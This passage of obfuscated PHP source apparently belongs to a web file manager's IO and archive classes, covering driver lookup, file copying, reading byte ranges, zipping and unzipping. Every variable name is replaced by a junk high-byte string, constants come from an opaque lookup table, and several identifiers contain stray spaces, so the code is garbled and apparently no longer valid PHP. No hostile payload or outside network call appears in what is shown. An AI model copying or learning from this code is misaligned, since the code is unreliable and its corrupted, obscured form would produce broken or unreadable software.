$ùóÊÇÇ <= $Ç¤ƒ± ×[$¸§Óö¡â]) { $ùóÊÇÇ = $Ç¤ƒ± ×[$¸§Óö¡â]; break; } else { if ($ùóÊÇÇ > $Ç¤ƒ± ×[$¸§Óö¡â - 1] && $ùóÊÇÇ <= $Ç¤ƒ± ×[$¸§Óö¡â]) { $ùóÊÇÇ = $Ç¤ƒ± ×[$¸§Óö¡â]; break; } else { if ($¸§Óö¡â == count($Ç¤ƒ± ×) - 1 && $ùóÊÇÇ > $Ç¤ƒ± ×[$¸§Óö¡â]) { $ùóÊÇÇ = $Ç¤ƒ± ×[$¸§Óö¡â]; break; } } } } $ªæèÇœ = self::driverMake($¢Ûí‚¦); if ($ªæèÇœ->isFileOutServer()) { return $ªæèÇœ->fileOutImageServer($¢Ûí‚¦, $ùóÊÇÇ); } return $ªæèÇœ->fileOutImage($¢Ûí‚¦, $ùóÊÇÇ); } private static function driverIsSame($Ò›¶Ä û, $¥‡•¼™) { $ä„ñ–™™ =& $_SERVER[¬ÏÕ§Áú]; $ÀöÁ™úĞ = $Ò›¶Ä û->getType(); $ûÇæÓ = $¥‡•¼™->getType(); if ($ÀöÁ™úĞ != $ûÇæÓ) { return !1; } if ($ÀöÁ™úĞ == $ä„ñ–™™[871]) { return !0; } if ($ÀöÁ™úĞ == $ä„ñ–™™[119]) { return !0; } if ($Ò›¶Ä û->pathDriver == $¥‡•¼™->pathDriver) { return !0; } return !1; } public static function copyUpdate($¢ÍæÄÆ, $†ÙÒğ‹›) { $…”ıÚšç =& $_SERVER[¬ÏÕ§Áú]; if (!IO::exist($¢ÍæÄÆ)) { return !1; } if (!IO::exist($†ÙÒğ‹›)) { IO::mkdir($†ÙÒğ‹›); } $â÷‡í¡ƒ = array_to_keyvalue(self::listAllSimple($¢ÍæÄÆ), $…”ıÚšç[97]); $Û”Ñ×Ÿ¡ = array_to_keyvalue(self::listAllSimple($†ÙÒğ‹›), $…”ıÚšç[97]); $»±–¯Ëø = array(); $ó…›İõÖ = array(); foreach ($â÷‡í¡ƒ as $Ï¾¸µ => $€´¶ôäõ) { if (isset($Û”Ñ×Ÿ¡[$Ï¾¸µ])) { if ($€´¶ôäõ[$…”ıÚšç[88]] == 1) { continue; } if ($Û”Ñ×Ÿ¡[$Ï¾¸µ][$…”ıÚšç[89]] == $€´¶ôäõ[$…”ıÚšç[89]]) { continue; } } if ($€´¶ôäõ[$…”ıÚšç[88]] == 1) { $ó…›İõÖ[] = $†ÙÒğ‹› . $…”ıÚšç[8] . trim($Ï¾¸µ, $…”ıÚšç[8]); continue; } $şşÑ‰ñü = strstr(trim($Ï¾¸µ, $…”ıÚšç[8]), $…”ıÚšç[8]) ? get_path_father($Ï¾¸µ) : $…”ıÚšç[12]; $»±–¯Ëø[] = array($…”ıÚšç[1294] => $€´¶ôäõ[$…”ıÚšç[99]], $…”ıÚšç[1295] => rtrim($†ÙÒğ‹›, $…”ıÚšç[8]) . $…”ıÚšç[8] . $şşÑ‰ñü, $…”ıÚšç[1296] => $€´¶ôäõ); } $–ñ¯Ğ¸± = array($…”ıÚšç[243] => $»±–¯Ëø, $…”ıÚšç[88] => $ó…›İõÖ); Hook::trigger($…”ıÚšç[1297], $¢ÍæÄÆ, $†ÙÒğ‹›, $–ñ¯Ğ¸±); foreach ($ó…›İõÖ as $€´¶ôäõ) { IO::mkdir($€´¶ôäõ); } foreach ($»±–¯Ëø as $€´¶ôäõ) { IO::copy($€´¶ôäõ[$…”ıÚšç[1294]], $€´¶ôäõ[$…”ıÚšç[1295]], REPEAT_REPLACE); } } public static function fileSubstr($›ŸàõˆÜ, $ÖÎíÛ®, $ÖÑ˜™™ = false) { $Ú•íŠµ =& $_SERVER[¬ÏÕ§Áú]; $İóÆëÛä = self::driverMake($›ŸàõˆÜ); $¦›çŠ = $İóÆëÛä->size($›ŸàõˆÜ); $Õ¦Ñ‹Îİ = $ÖÎíÛ®; $„ï±³Ãä = $ÖÑ˜™™; if ($ÖÎíÛ® < 0) { $ÖÎíÛ® = $¦›çŠ + $ÖÎíÛ®; } if ($ÖÑ˜™™ === !1) { $ÖÑ˜™™ = $¦›çŠ - $ÖÎíÛ®; } if ($ÖÎíÛ® + $ÖÑ˜™™ > $¦›çŠ) { $ÖÑ˜™™ = $¦›çŠ - $ÖÎíÛ®; } if (!$¦›çŠ && $İóÆëÛä->getType() == $Ú•íŠµ[119] && !$İóÆëÛä->exist($›ŸàõˆÜ)) { $Õ±òŒ« = get_path_this($›ŸàõˆÜ); $—’í‡¹ş = parse_url_query($Õ±òŒ«); if (is_array($—’í‡¹ş) && isset($—’í‡¹ş[$Ú•íŠµ[32]])) { $Õ±òŒ« = urldecode($—’í‡¹ş[$Ú•íŠµ[32]]); } throw new Exception($Ú•íŠµ[1298] . LNG($Ú•íŠµ[1299]) . $Ú•íŠµ[1091] . clear_html($Õ±òŒ«) . $Ú•íŠµ[12]); } if ($ÖÑ˜™™ <= 0) { return $Ú•íŠµ[12]; } if ($ÖÎíÛ® < 0 || $ÖÎíÛ® >= $¦›çŠ || $ÖÑ˜™™ > $GLOBALS[$Ú•íŠµ[6]][$Ú•íŠµ[102]][$Ú•íŠµ[1300]]) { throw new Exception("\146\151\x6c\x65\122\145\141\144\x20\x65\x72\162\x6f\162\x2c\157\x76\145\162\40\151\x6f\122\x65\x61\144\x4d\141\170\41\40\163\164\x61\x72\164\75{$ÖÎíÛ®}\73\x6c\145\156\147\164\150\x3d{$ÖÑ˜™™}\x3b\x20\163\151\172\145\x3d{$¦›çŠ}\x3b"); } $²Õ èˆû = $İóÆëÛä->fileSubstr($›ŸàõˆÜ, $ÖÎíÛ®, $ÖÑ˜™™); if (!$²Õ èˆû && $ÖÑ˜™™ && isset($GLOBALS[$Ú•íŠµ[1301]])) { throw new Exception($GLOBALS[$Ú•íŠµ[1301]][$Ú•íŠµ[1302]]); } return $²Õ èˆû; } private static function driverMake(&$ØùïµŠ) { $³ìçíğİ =& $_SERVER[¬ÏÕ§Áú]; $£š“°úÄ = KodIO::parse($ØùïµŠ); if (!self::$driverListSystem) { $ó§±šÁÂ = Model($³ìçíğİ[881])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ó§±šÁÂ, $³ìçíğİ[492]); } if ($£š“°úÄ[$³ìçíğİ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$£š“°úÄ[$³ìçíğİ[492]]]) { throw new Exception($³ìçíğİ[1303]); return !1; } $ØùïµŠ = $£š“°úÄ[$³ìçíğİ[1304]]; $Ë¼Ó¶‰„ = self::driverGet($£š“°úÄ, $ØùïµŠ); return $Ë¼Ó¶‰„; } private static function driverGet($”Ö¿é¥‚, &$¹¾Æ»İ€) { $¤¸æ³¤ã =& $_SERVER[¬ÏÕ§Áú]; $¿Ñ¹íÚ = $”Ö¿é¥‚[$¤¸æ³¤ã[1305]]; $ˆÅä× Ê = $”Ö¿é¥‚[$¤¸æ³¤ã[492]]; switch ($”Ö¿é¥‚[$¤¸æ³¤ã[33]]) { case KodIO::KOD_IO: $Ã·Â® = self::$driverListSystem[$ˆÅä× Ê]; break; case KodIO::KOD_SOURCE: $¹¾Æ»İ€ = $ˆÅä× Ê . $¹¾Æ»İ€; $Ã·Â® = array($¤¸æ³¤ã[1306] => $¤¸æ³¤ã[1307], $¤¸æ³¤ã[6] => $”Ö¿é¥‚); $Ã·Â®[$¤¸æ³¤ã[6]][$¤¸æ³¤ã[1308]] = $”Ö¿é¥‚[$¤¸æ³¤ã[492]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¿î‡×ãà = $GLOBALS[$¤¸æ³¤ã[1309]]; self::$driverListUser = array_to_keyvalue($¿î‡×ãà, $¤¸æ³¤ã[492]); } $Ã·Â® = self::$driverListUser[$ˆÅä× Ê]; break; case KodIO::KOD_SHARE_LINK: $Ã·Â® = array($¤¸æ³¤ã[1306] => $¤¸æ³¤ã[1310], $¤¸æ³¤ã[6] => $”Ö¿é¥‚); $Äª³îÎÙ = Action($¤¸æ³¤ã[1311])->sharePathInfo($”Ö¿é¥‚[$¤¸æ³¤ã[97]]); $¹¾Æ»İ€ = $Äª³îÎÙ[$¤¸æ³¤ã[204]]; if (!$Äª³îÎÙ[$¤¸æ³¤ã[204]]) { $Ù¿™Ì£ = Model($¤¸æ³¤ã[688])->getInfo($Äª³îÎÙ[$¤¸æ³¤ã[689]]); $¹¾Æ»İ€ = KodIO::clear($Ù¿™Ì£[$¤¸æ³¤ã[1312]] . $”Ö¿é¥‚[$¤¸æ³¤ã[1304]]); $”Ö¿é¥‚[$¤¸æ³¤ã[581]] = $Ù¿™Ì£; $”Ö¿é¥‚[$¤¸æ³¤ã[1285]] = $¹¾Æ»İ€; $Ã·Â® = array($¤¸æ³¤ã[1306] => $¤¸æ³¤ã[1313], $¤¸æ³¤ã[6] => $”Ö¿é¥‚); } else { $Ã·Â®[$¤¸æ³¤ã[6]][$¤¸æ³¤ã[1308]] = $Äª³îÎÙ[$¤¸æ³¤ã[204]]; } break; case KodIO::KOD_SHARE_ITEM: $Ã·Â® = array($¤¸æ³¤ã[1306] => $¤¸æ³¤ã[1314], $¤¸æ³¤ã[6] => $”Ö¿é¥‚); $Ù¿™Ì£ = Model($¤¸æ³¤ã[688])->getInfo($”Ö¿é¥‚[$¤¸æ³¤ã[492]]); if ($Ù¿™Ì£[$¤¸æ³¤ã[204]] == $¤¸æ³¤ã[241]) { $¹¾Æ»İ€ = KodIO::clear($Ù¿™Ì£[$¤¸æ³¤ã[1312]] . $”Ö¿é¥‚[$¤¸æ³¤ã[1304]]); $”Ö¿é¥‚[$¤¸æ³¤ã[581]] = $Ù¿™Ì£; $”Ö¿é¥‚[$¤¸æ³¤ã[1285]] = $¹¾Æ»İ€; $Ã·Â® = array($¤¸æ³¤ã[1306] => $¤¸æ³¤ã[1315], $¤¸æ³¤ã[6] => $”Ö¿é¥‚); } else { if (!$¹¾Æ»İ€) { $¹¾Æ»İ€ = $Ù¿™Ì£[$¤¸æ³¤ã[204]]; } $Ã·Â®[$¤¸æ³¤ã[6]][$¤¸æ³¤ã[1308]] = $Ù¿™Ì£[$¤¸æ³¤ã[204]]; } break; default: $¹¾Æ»İ€ = $”Ö¿é¥‚[$¤¸æ³¤ã[97]]; $Ã·Â® = array($¤¸æ³¤ã[1306] => $¤¸æ³¤ã[1316]); break; } $Üûì‰Á¢ = $”Ö¿é¥‚[$¤¸æ³¤ã[97]]; if (!isset(self::$driverCache[$Üûì‰Á¢])) { $¯¯ø…â = strtolower($Ã·Â®[$¤¸æ³¤ã[108]]); $ŒË¤ôÙ« = $GLOBALS[$¤¸æ³¤ã[6]][$¤¸æ³¤ã[102]][$¤¸æ³¤ã[947]]; $±øÂ—Ü¥ = $¤¸æ³¤ã[87] . (isset($ŒË¤ôÙ«[$¯¯ø…â]) ? $ŒË¤ôÙ«[$¯¯ø…â] : ucfirst($¯¯ø…â)); if (!class_exists($±øÂ—Ü¥)) { show_json("{$±øÂ—Ü¥}\x20\x6e\157\164\x20\x65\x78\x69\x73\x74\163\x21", !1); } $åœÔĞæ‘ = isset($Ã·Â®[$¤¸æ³¤ã[6]]) ? $Ã·Â®[$¤¸æ³¤ã[6]] : !1; self::$driverCache[$Üûì‰Á¢] = new $±øÂ—Ü¥($åœÔĞæ‘); } $Ú˜Êñ = self::$driverCache[$Üûì‰Á¢]; $Ú˜Êñ->pathDriver = $¿Ñ¹íÚ; $Ú˜Êñ->pathBase = $¤¸æ³¤ã[12]; if (isset($Ã·Â®[$¤¸æ³¤ã[6]][$¤¸æ³¤ã[1317]])) { $Ú˜Êñ->pathBase = rtrim($Ã·Â®[$¤¸æ³¤ã[6]][$¤¸æ³¤ã[1317]], $¤¸æ³¤ã[8]) . $¤¸æ³¤ã[8]; $¹¾Æ»İ€ = $Ú˜Êñ->pathBase . ltrim($¹¾Æ»İ€, $¤¸æ³¤ã[8]); } $¹¾Æ»İ€ = $Ú˜Êñ->getPath($¹¾Æ»İ€); if (isset($”Ö¿é¥‚[$¤¸æ³¤ã[1285]])) { $¹¾Æ»İ€ = $”Ö¿é¥‚[$¤¸æ³¤ã[1285]]; } $Ú˜Êñ->path = $¹¾Æ»İ€; return $Ú˜Êñ; } public static function errorTips($å†÷Ä = false) { $Ÿ…ãÚï‡ =& $_SERVER[¬ÏÕ§Áú]; static $¤Ú…Ü ú = array(); $Ä¬Ø©ßÛ = 1000; if ($å†÷Ä === -1) { return $¤Ú…Ü ú ? $¤Ú…Ü ú[count($¤Ú…Ü ú) - 1] : $Ÿ…ãÚï‡[12]; } if ($å†÷Ä === !1) { return implode($Ÿ…ãÚï‡[65], $¤Ú…Ü ú); } if (count($¤Ú…Ü ú) >= $Ä¬Ø©ßÛ) { $¤Ú…Ü ú = array_slice($¤Ú…Ü ú, $Ä¬Ø©ßÛ * 0.5, $Ä¬Ø©ßÛ); } $¤Ú…Ü ú[] = $å†÷Ä; write_log($Ÿ…ãÚï‡[186] . ACTION . $Ÿ…ãÚï‡[1318] . $å†÷Ä, $Ÿ…ãÚï‡[1319]); } public static function getLastError($®î‹Åœ = '') { $Ä·ºı¾Ê = self::errorTips(-1); return $Ä·ºı¾Ê ? $Ä·ºı¾Ê : $®î‹Åœ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $˜£´«ûˆ; if ($˜£´«ûˆ) { return $˜£´«ûˆ; } $©É÷³Ãş = IO::init($_SERVER[¬ÏÕ§Áú][8]); return $©É÷³Ãş; } private static function iconvSystem($¤ÏßÈË‚) { return self::local()->iconvSystem($¤ÏßÈË‚); } private static function iconvApp($ó—‘ô¦«) { return self::local()->iconvApp($ó—‘ô¦«); } public static function zipFolder($ÆÒÃ±‘‡, $éš˜şšŞ = "\x7a\151\160", $ìÈõ×·ë = '', $æÎÙÌ¬¼ = REPEAT_RENAME) { $ÈñåÌ–Ó =& $_SERVER[¬ÏÕ§Áú]; $ƒÈ¾ÊÜ‚ = IO::listPath($ÆÒÃ±‘‡); if (!$ƒÈ¾ÊÜ‚) { return !1; } $ƒÈ¾ÊÜ‚ = array_merge($ƒÈ¾ÊÜ‚[$ÈñåÌ–Ó[95]], $ƒÈ¾ÊÜ‚[$ÈñåÌ–Ó[96]]); return self::zip($ƒÈ¾ÊÜ‚, $éš˜şšŞ, $ìÈõ×·ë, $æÎÙÌ¬¼); } public static function zip($¶ û–Î, $ãÎÊ–Íø = "\172\x69\x70", $†ì»¾²“ = '', $¼ÔîµÜî = REPEAT_RENAME) { $Ì‹µ› =& $_SERVER[¬ÏÕ§Áú]; if (is_string($¶ û–Î) && $¶ û–Î) { $¶ û–Î = array(array($Ì‹µ›[97] => $¶ û–Î)); } $ì’úÔ•´ = self::init($¶ û–Î[0][$Ì‹µ›[97]]); $¿¡¹øÛ¾ = self::info($¶ û–Î[0][$Ì‹µ›[97]]); $ºÄ¸Ä½ƒ = $Ì‹µ›[12]; $ÎÒ¥Ì¾¿ = $Ì‹µ›[12]; $¹¸²ÂáŠ = $Ì‹µ›[12]; if ($†ì»¾²“ && substr($†ì»¾²“, -1, 1) != $Ì‹µ›[8]) { $ÎÒ¥Ì¾¿ = get_path_father($†ì»¾²“); $¹¸²ÂáŠ = get_path_this($†ì»¾²“); } else { $ÎÒ¥Ì¾¿ = self::pathFather($¿¡¹øÛ¾[$Ì‹µ›[97]]); $¹¸²ÂáŠ = $¿¡¹øÛ¾[$Ì‹µ›[32]] . $Ì‹µ›[10] . $ãÎÊ–Íø; if (count($¶ û–Î) > 1) { $ÆŒ´íˆ‡ = IO::info($ÎÒ¥Ì¾¿); $¹¸²ÂáŠ = $ÆŒ´íˆ‡[$Ì‹µ›[32]] . $Ì‹µ›[10] . $ãÎÊ–Íø; } if ($†ì»¾²“) { $ÎÒ¥Ì¾¿ = $†ì»¾²“; } } if ($ì’úÔ•´->getType() == $Ì‹µ›[119]) { $»şÖäĞ… = self::init($ÎÒ¥Ì¾¿); $àò¬Úş = $»şÖäĞ…->getType() == $Ì‹µ›[119] ? $ÎÒ¥Ì¾¿ : get_path_father($ì’úÔ•´->path); $àò¬Úş = IO::getPathInner($àò¬Úş); $àò¬Úş = rtrim($àò¬Úş, $Ì‹µ›[8]) . $Ì‹µ›[8]; mk_dir($àò¬Úş); } else { $ºÄ¸Ä½ƒ = TEMP_FILES . $Ì‹µ›[1320] . time() . rand_string(8) . $Ì‹µ›[8]; mk_dir($ºÄ¸Ä½ƒ); file_put_contents($ºÄ¸Ä½ƒ . $Ì‹µ›[1321], $Ì‹µ›[12]); $àò¬Úş = $ºÄ¸Ä½ƒ; } $¯Ÿçø¼ = IO::info($àò¬Úş); if (!$¯Ÿçø¼ || !$¯Ÿçø¼[$Ì‹µ›[246]]) { show_json(LNG($Ì‹µ›[1322]), !1); } $ëˆ¤˜·§ = self::zipFileList($¶ û–Î, $ºÄ¸Ä½ƒ); foreach ($ëˆ¤˜·§ as $‹¡¸¿ó => $ËëÕîß) { $ëˆ¤˜·§[$‹¡¸¿ó] = self::iconvSystem($ËëÕîß); } $å·ƒŞ×Ú = get_filename_auto($àò¬Úş . $¹¸²ÂáŠ, $Ì‹µ›[12], $¼ÔîµÜî); KodArchive::create(self::iconvSystem($å·ƒŞ×Ú), $ëˆ¤˜·§); if (!IO::exist($å·ƒŞ×Ú)) { if ($ºÄ¸Ä½ƒ) { del_dir($ºÄ¸Ä½ƒ); } write_log($Ì‹µ›[1323] . $å·ƒŞ×Ú, $Ì‹µ›[399]); show_json(LNG($Ì‹µ›[1324]), !1); } if (!$ºÄ¸Ä½ƒ) { return $å·ƒŞ×Ú; } $Ş¯â Åş = self::move($å·ƒŞ×Ú, $ÎÒ¥Ì¾¿, $¼ÔîµÜî); if ($ºÄ¸Ä½ƒ) { del_dir($ºÄ¸Ä½ƒ); } if (!$å·ƒŞ×Ú) { write_log($Ì‹µ›[1325] . $å·ƒŞ×Ú . $Ì‹µ›[1326] . $ÎÒ¥Ì¾¿, $Ì‹µ›[399]); show_json(LNG($Ì‹µ›[1324]), !1); } return $Ş¯â Åş; } public static function unzip($û á˜Õè, $Ö´ä¶ Ö, $™°±Üà¼ = "\x2d\x31", $ìØå—Ÿ­ = "\x72\145\x70\154\x61\x63\145") { $óï÷¢Æ« =& $_SERVER[¬ÏÕ§Áú]; $Ç¨Í›Â­ = parent::info($û á˜Õè); if (!$Ç¨Í›Â­) { show_json(LNG($óï÷¢Æ«[1327]), !1); } $¯„ñ¦İÖ = IO::infoFullSimple($Ö´ä¶ Ö); if (!$¯„ñ¦İÖ) { $Ö´ä¶ Ö = IO::mkdir($Ö´ä¶ Ö); } if (isset($¯„ñ¦İÖ[$óï÷¢Æ«[204]]) && trim($¯„ñ¦İÖ[$óï÷¢Æ«[97]], $óï÷¢Æ«[8]) != trim($Ö´ä¶ Ö, $óï÷¢Æ«[8])) { $…ãÂ××Ä = KodIO::make($¯„ñ¦İÖ[$óï÷¢Æ«[203]]); $®É£òğ½ = IO::fileNameAuto($…ãÂ××Ä, $¯„ñ¦İÖ[$óï÷¢Æ«[32]], REPEAT_RENAME_FOLDER, !0); $Ö´ä¶ Ö = IO::mkdir($…ãÂ××Ä . $®É£òğ½); } $™°±Üà¼ = $™°±Üà¼ && $™°±Üà¼ != $óï÷¢Æ«[1328] ? @json_decode($™°±Üà¼, !0) : -1; $Œ ¢éÔ = self::unzipPart($û á˜Õè, $™°±Üà¼); if (!$Œ ¢éÔ || !IO::exist($Œ ¢éÔ[$óï÷¢Æ«[243]])) { show_json(LNG($óï÷¢Æ«[118]), !1); } $®ÕÆ²ËÙ = $Œ ¢éÔ[$óï÷¢Æ«[1329]][count($Œ ¢éÔ[$óï÷¢Æ«[1329]]) - 1]; if ($®ÕÆ²ËÙ[$óï÷¢Æ«[1330]] == -1 || substr($®ÕÆ²ËÙ[$óï÷¢Æ«[32]], -1, 1) == $óï÷¢Æ«[8]) { $´êµâ”æ = $Œ ¢éÔ[$óï÷¢Æ«[1331]] . rand_string(10) . $óï÷¢Æ«[8]; mk_dir($´êµâ”æ); $æ„ãÜù = count($Œ ¢éÔ[$óï÷¢Æ«[1329]]) == 1 ? IO::ext($û á˜Õè) : get_path_ext($Œ ¢éÔ[$óï÷¢Æ«[243]]); $ù·â‚™Ë = KodArchive::extract(self::iconvSystem($Œ ¢éÔ[$óï÷¢Æ«[243]]), $´êµâ”æ, $®ÕÆ²ËÙ[$óï÷¢Æ«[1330]], $®É£òğ½, $æ„ãÜù); self::unzipErrorCheck($ù·â‚™Ë, array($óï÷¢Æ«[1332], $û á˜Õè, $æ„ãÜù, $Ö´ä¶ Ö, $Œ ¢éÔ)); Hook::trigger($óï÷¢Æ«[1333], $´êµâ”æ); recursion_dir($´êµâ”æ, $àğò†»ñ, $¿Äê­¢Ì, 0); $¯ş÷Şè™ = array_merge($àğò†»ñ, $¿Äê­¢Ì); $áÒ¸ƒ‡· = array(); foreach ($¯ş÷Şè™ as $¤‡Ì¦¬«) { $ôÚµ’Ş = IO::move(self::iconvApp($¤‡Ì¦¬«), $Ö´ä¶ Ö, $ìØå—Ÿ­); if ($ôÚµ’Ş) { $áÒ¸ƒ‡·[] = $ôÚµ’Ş; } } del_dir($´êµâ”æ); } else { $ôÚµ’Ş = IO::move($Œ ¢éÔ[$óï÷¢Æ«[243]], $Ö´ä¶ Ö, $ìØå—Ÿ­, get_path_this($®ÕÆ²ËÙ[$óï÷¢Æ«[32]])); if ($ôÚµ’Ş) { $áÒ¸ƒ‡·[] = $ôÚµ’Ş; } } return $áÒ¸ƒ‡· ? $áÒ¸ƒ‡· : !1; } public static function unzipList($ºğè¡¼º) { $óşÚŒå‹ =& $_SERVER[¬ÏÕ§Áú]; $áì³Ï–™ = isset($ºğè¡¼º[$óşÚŒå‹[1334]]) ? $ºğè¡¼º[$óşÚŒå‹[1334]] : !1; $¬èáì÷Ö = isset($ºğè¡¼º[$óşÚŒå‹[1330]]) ? @json_decode($ºğè¡¼º[$óşÚŒå‹[1330]], !0) : -1; $£¸ìºú = self::unzipPart($ºğè¡¼º[$óşÚŒå‹[97]], $¬èáì÷Ö); if (!$£¸ìºú || !IO::exist($£¸ìºú[$óşÚŒå‹[243]])) { show_json(LNG($óşÚŒå‹[118]), !1); } $¬’Äˆçİ = $£¸ìºú[$óşÚŒå‹[1329]][count($£¸ìºú[$óşÚŒå‹[1329]]) - 1]; $ÛÂº†ã = in_array(IO::ext($£¸ìºú[$óşÚŒå‹[243]]), array($óşÚŒå‹[399], $óşÚŒå‹[1335], $óşÚŒå‹[1336], $óşÚŒå‹[1337], $óşÚŒå‹[1338], $óşÚŒå‹[1339])); if (!$áì³Ï–™ && ($¬’Äˆçİ[$óşÚŒå‹[1330]] == -1 || $ÛÂº†ã)) { $È è’¤õ = $£¸ìºú[$óşÚŒå‹[1331]] . get_path_this($£¸ìºú[$óşÚŒå‹[243]]) . $óşÚŒå‹[1340]; if (!IO::exist($È è’¤õ)) { $ºÁ”Ä­á = $¬’Äˆçİ[$óşÚŒå‹[1330]] == -1 ? get_path_ext(IO::pathThis($ºğè¡¼º[$óşÚŒå‹[97]])) : get_path_ext($£¸ìºú[$óşÚŒå‹[243]]); $”¼ô•Şî = KodArchive::listContent(self::iconvSystem($£¸ìºú[$óşÚŒå‹[243]]), !0, $ºÁ”Ä­á); self::unzipErrorCheck($”¼ô•Şî, array($óşÚŒå‹[1341], $ºğè¡¼º, $£¸ìºú)); @file_put_contents($È è’¤õ, json_encode($”¼ô•Şî[$óşÚŒå‹[1342]])); } return @json_decode(IO::getContent($È è’¤õ), !0); } IO::fileOut($£¸ìºú[$óşÚŒå‹[243]], $áì³Ï–™, get_path_this($¬’Äˆçİ[$óşÚŒå‹[32]])); die; } private static function zipFileList($ˆÚºÉàß, $¸‰óÛ‘ = false) { $ò´Œò«” =& $_SERVER[¬ÏÕ§Áú]; $©ĞÜà×½ = array(); foreach ($ˆÚºÉàß as $º˜•¬…) { $ª–Æ©²Ä = $º˜•¬…[$ò´Œò«”[97]]; if ($¸‰óÛ‘) { $ª–Æ©²Ä = self::copy($º˜•¬…[$ò´Œò«”[97]], $¸‰óÛ‘, $ò´Œò«”[940]); } else { $óÚáãí† = self::init($º˜•¬…[$ò´Œò«”[97]]); if ($óÚáãí†->getType() == $ò´Œò«”[119]) { $ª–Æ©²Ä = $óÚáãí†->path; } } if ($ª–Æ©²Ä && self::local()->exist($ª–Æ©²Ä)) { $©ĞÜà×½[$º˜•¬…[$ò´Œò«”[97]]] = $ª–Æ©²Ä; } } if (!empty($©ĞÜà×½)) { return array_values($©ĞÜà×½); } show_json(LNG($ò´Œò«”[1299]), !1); } private static function localFilePath($óÍ°ŒÎÌ) { $ÆÒªÏ’´ =& $_SERVER[¬ÏÕ§Áú]; $¢â’òàÓ = KodIO::parse($óÍ°ŒÎÌ); if ($¢â’òàÓ[$ÆÒªÏ’´[33]] == KodIO::KOD_SOURCE) { $ĞŒ›ÂĞÎ = Model($ÆÒªÏ’´[946])->fileInfoGet(KodIO::sourceID($óÍ°ŒÎÌ)); if (!$ĞŒ›ÂĞÎ[$ÆÒªÏ’´[97]]) { show_json($ÆÒªÏ’´[1343], !1); } $óÍ°ŒÎÌ = $ĞŒ›ÂĞÎ[$ÆÒªÏ’´[97]]; } $¹‰™ğäÆ = self::init($óÍ°ŒÎÌ); if ($¹‰™ğäÆ->pathParse[$ÆÒªÏ’´[1285]]) { $óÍ°ŒÎÌ = $¹‰™ğäÆ->pathParse[$ÆÒªÏ’´[1285]]; $¹‰™ğäÆ = self::init($óÍ°ŒÎÌ); } $ñ‘ò¤Ìœ = $¹‰™ğäÆ->getType(); if ($ñ‘ò¤Ìœ == $ÆÒªÏ’´[119] || $ñ‘ò¤Ìœ == $ÆÒªÏ’´[1344]) { if (!$¹‰™ğäÆ->exist($¹‰™ğäÆ->path)) { show_json(LNG($ÆÒªÏ’´[118]), !1); } return $¹‰™ğäÆ->path; } return !1; } public static function unzipPart($ñ·ïú†­, $©ˆá›òà = -1) { $Œ«õÑ´Æ =& $_SERVER[¬ÏÕ§Áú]; $€¦¼¹ = IO::pathThis($ñ·ïú†­); if (!$©ˆá›òà || $©ˆá›òà == -1) { $Á’äª¿® = array(array($Œ«õÑ´Æ[32] => $€¦¼¹, $Œ«õÑ´Æ[1330] => -1)); $Á’äª¿®[0][$Œ«õÑ´Æ[1345]] = $Á’äª¿®[0][$Œ«õÑ´Æ[32]]; } else { if (is_array($©ˆá›òà)) { $Á’äª¿® = $©ˆá›òà; $È©¤Ğ¯ = count($Á’äª¿®) - 1; for ($¥èÄœÑ‹ = 0; $¥èÄœÑ‹ <= $È©¤Ğ¯; $¥èÄœÑ‹++) { $çú–ÃÀ = $Á’äª¿®[$¥èÄœÑ‹]; $ÙÁ§şÙ = get_path_this($çú–ÃÀ[$Œ«õÑ´Æ[32]]) . (checkExtSafe($çú–ÃÀ[$Œ«õÑ´Æ[32]]) ? $Œ«õÑ´Æ[12] : $Œ«õÑ´Æ[1346]); $Á’äª¿®[$¥èÄœÑ‹][$Œ«õÑ´Æ[1345]] = $Œ«õÑ´Æ[1347] . intval($çú–ÃÀ[$Œ«õÑ´Æ[1330]]) . $Œ«õÑ´Æ[482] . $ÙÁ§şÙ; if ($¥èÄœÑ‹ == 0) { continue; } $Á’äª¿®[$¥èÄœÑ‹][$Œ«õÑ´Æ[1345]] = $Á’äª¿®[$¥èÄœÑ‹ - 1][$Œ«õÑ´Æ[1345]] . $Œ«õÑ´Æ[1348] . $Á’äª¿®[$¥èÄœÑ‹][$Œ«õÑ´Æ[1345]]; } } } if (!is_array($Á’äª¿®) || count($Á’äª¿®) == 0) { return !1; } $»æ‡ÕÉ˜ = $Á’äª¿®[count($Á’äª¿®) - 1]; if (!IO::exist($ñ·ïú†­)) { return !1; } $ã™£ŸÙ× = TEMP_FILES . $Œ«õÑ´Æ[1349] . kodIO::hashPathSafe($ñ·ïú†­) . $Œ«õÑ´Æ[8]; $¥ÏŞ¥Âä = $ã™£ŸÙ× . $»æ‡ÕÉ˜[$Œ«õÑ´Æ[1345]]; mk_dir($ã™£ŸÙ×); file_put_contents(TEMP_FILES . $Œ«õÑ´Æ[1321], $Œ«õÑ´Æ[12]); if (IO::exist($¥ÏŞ¥Âä)) { return array($Œ«õÑ´Æ[243] => $¥ÏŞ¥Âä, $Œ«õÑ´Æ[1329] => $Á’äª¿®, $Œ«õÑ´Æ[1331] => $ã™£ŸÙ×); } $Ã©ô¡è© = self::localFilePath($ñ·ïú†­); if (!$Ã©ô¡è©) { $Ã©ô¡è© = $ã™£ŸÙ× . $Œ«õÑ´Æ[1350]; if (!IO::exist($Ã©ô¡è©)) { self::copy($ñ·ïú†­, $ã™£ŸÙ×, !1, get_path_this($Ã©ô¡è©)); } } if (!$Ã©ô¡è© || !IO::exist($Ã©ô¡è©)) { return !1; } if ($»æ‡ÕÉ˜[$Œ«õÑ´Æ[1330]] == -1) { return array($Œ«õÑ´Æ[243] => $Ã©ô¡è©, $Œ«õÑ´Æ[1329] => $Á’äª¿®, $Œ«õÑ´Æ[1331] => $ã™£ŸÙ×); } $§ëğáàî = $Ã©ô¡è©; foreach ($Á’äª¿® as $¥èÄœÑ‹ => $çú–ÃÀ) { if (!$çú–ÃÀ || $çú–ÃÀ[$Œ«õÑ´Æ[1330]] == $Œ«õÑ´Æ[1328]) { break; } if (substr($çú–ÃÀ[$Œ«õÑ´Æ[32]], -1, 1) == $Œ«õÑ´Æ[8]) { break; } $âïàé˜ì = in_array(get_path_ext($çú–ÃÀ[$Œ«õÑ´Æ[1345]]), array($Œ«õÑ´Æ[399], $Œ«õÑ´Æ[1335], $Œ«õÑ´Æ[1336], $Œ«õÑ´Æ[1337], 